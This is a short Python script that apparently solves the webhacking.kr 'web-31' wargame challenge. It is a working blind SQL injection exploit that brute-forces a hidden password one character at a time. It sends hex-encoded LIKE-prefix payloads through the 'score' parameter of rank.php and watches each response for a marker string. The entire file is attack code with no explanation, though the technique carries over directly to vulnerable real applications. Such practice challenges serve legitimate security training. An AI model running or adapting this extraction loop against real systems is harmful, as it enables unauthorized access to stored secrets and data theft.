import requests

url = 'https://webhacking.kr/challenge/web-31/rank.php?score='
dictionary = 'abcdefghijklmnopqrstuvwxyz!?1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_'
cookies = {
    'PHPSESSID' : 'your_phpsessid'
}

password = ''
for _ in range(1, 50):
    flag = 0
    for letter in dictionary:
        payload = '0||p4ssw0rd_1123581321%20like%200x{}25'.format(''.join([hex(ord(x))[2:] for x in password+letter]))
        response = requests.get(url+payload, cookies=cookies)
        print(payload)

        if 'her0gyu' in response.text:
            password += letter
            flag = 1
            break

    if flag == 0:
        break
print(password)